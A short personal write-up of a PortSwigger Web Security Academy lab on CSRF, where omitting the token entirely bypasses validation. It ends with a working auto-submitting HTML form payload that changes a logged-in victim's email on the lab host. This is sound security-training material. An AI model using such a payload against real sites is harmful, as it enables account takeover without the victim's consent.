
#portswigger #solution #csrf

- **Category:** [[Cross-site request forgery (CSRF)]]
- **Difficulty:** [[Apprentice]]
- **URL Lab:** https://portswigger.net/web-security/learning-paths/csrf
- **Date Solved:** 2026-08-13

Similar to previous LAB, [[CSRF vulnerability with no defenses]]
Same idea as [[CSRF where token validation depends on request method]], here we even get easier work: delete the csrf token entirely.

Final payload:
```html
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0ae000b1046fb2b9801e8b9900d70096.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="random2&#64;random&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

```
